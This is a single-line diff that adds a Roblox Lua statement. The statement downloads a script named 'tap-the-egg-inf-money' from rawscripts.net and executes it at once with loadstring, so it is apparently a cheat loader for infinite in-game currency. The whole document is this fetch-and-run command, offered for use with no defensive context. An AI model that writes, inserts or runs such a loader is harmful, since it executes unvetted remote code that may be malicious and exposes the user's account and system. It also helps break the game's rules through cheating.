@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://rawscripts.net/raw/tap-the-egg-inf-money-53920"))()
